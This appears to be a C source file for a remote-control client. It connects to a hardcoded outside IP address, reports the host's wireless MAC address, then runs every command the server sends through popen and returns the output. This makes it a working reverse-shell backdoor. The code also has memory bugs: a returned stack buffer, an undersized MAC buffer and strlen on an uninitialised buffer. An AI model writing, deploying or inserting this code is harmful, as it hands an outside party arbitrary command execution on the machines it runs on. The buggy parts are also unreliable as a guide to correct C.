#include "util.h"
#include <arpa/inet.h>
#include <dirent.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>      // exit, EXIT_FAILURE
#include <stdnoreturn.h> // noreturn
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define MSG_SIZE 4096
#define MYPORT 7400
#define HOSTNAME "208.91.55.199"

FILE *recv_exec_msg(int sockfd, char msg[], int msg_size) {
  /* Receive and process messages from the server */
  ssize_t bytes_received = recv(sockfd, msg, msg_size, 0);

  if (bytes_received < 0) {
    error_and_exit("Error reading from socket \n");
  } else if (bytes_received == 0) {
    error_and_exit("Server disconnected \n");
  } else {
    msg[bytes_received] = '\0'; // Null-terminate the received message
    printf("%s\n", msg);
    // Process the received  message here (e.g., execute commands)
    FILE *output_pipe = popen(msg, "r");
    if (!output_pipe) {
      error_and_exit("Error Executing Commands \n");
    }

    return output_pipe;
  }
}

char *find_devices(char path[]) {
  struct dirent *de; // Pointer for directory entry
  char network_interface[20];

  // opendir() returns a pointer of DIR type.
  DIR *dr = opendir(path);

  // Error Checking
  if (dr == NULL) {
    error_and_exit("Could not open given directory");
  }

  // Hard_coded to look for the WLAN (wl)
  while ((de = readdir(dr)) != NULL) {
    if (de->d_name[0] == 'w' && de->d_name[1] == 'l') {
      closedir(dr);
      return strcpy(network_interface, de->d_name);
    }
  }

  closedir(dr);
  return NULL;
}

int mac_address(char interface[], char addr[]) {
  struct ifreq s;
  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
  char temp[3];
  // Error Checking
  if (interface == NULL) {
    error_and_exit("No Valid interface\n");
  }
  if (fd == -1) {
    error_and_exit("Can't open socket\n");
  }
  strcpy(s.ifr_name, interface);
  if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
    addr[0] = '\0'; // Initialize addr as an empty string
    for (int i = 0; i < 6; ++i) {
      sprintf(temp, "%02X", (unsigned char)s.ifr_hwaddr.sa_data[i]);
      strcat(addr, temp);
    }
    close(fd); // Close the socket
    return 0;
  }

  close(fd); // Close the socket
  return -1; // Didn't work.
}

int main() {
  /* Create a socket for the client */
  int sockfd = open_tcp_socket();

  /* Get server's IP address */
  struct hostent *server = gethostbyname(HOSTNAME);
  if (server == NULL) {
    error_and_exit("Error: No such host \n");
  }

  struct sockaddr_in serv_addr = {
      .sin_family = AF_INET,
      .sin_port = (in_port_t)htons(MYPORT),
      .sin_addr = *(struct in_addr *)*server->h_addr_list,
  };

  try_connect(sockfd, serv_addr);

  printf("Connected to server.\n");
  char msg[MSG_SIZE];
  char output_buffer[MSG_SIZE]; // Adjust buffer size as needed
  char result_buffer[MSG_SIZE]; // Initialize an empty string buffer

  // Send MAC Address Once
  char *wl_interface = find_devices("/sys/class/net");
  char mac_addr[12];
  if (mac_address(wl_interface, mac_addr) == -1) {
    printf("Failed to get MAC Address");
  }

  printf("SENDING MAC ADDRESS: %s \n ", mac_addr);
  if (send(sockfd, mac_addr, strlen(mac_addr), 0) == -1) {
    error_and_exit("Error sending response to server\n");
  }

  while (1) {
    // Process the received message here (e.g., execute commands)
    FILE *output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
    memset(result_buffer, 0, strlen(result_buffer)); // clear result_buffer
    // Read the output of the command and send it back to the server
    while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
      strcat(result_buffer,
             output_buffer); // Append each line to the result buffer
    }

    printf("%s \n", result_buffer);

    // Send the result buffer back to the server
    if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
      pclose(output_pipe);
      error_and_exit("Error sending response to server\n");
    }

    fflush(stdout);      // Ensure the data is sent immediately
    pclose(output_pipe); // Close the output pipe
  }
  /* Close the socket */
  close(sockfd);
  return 0;
}
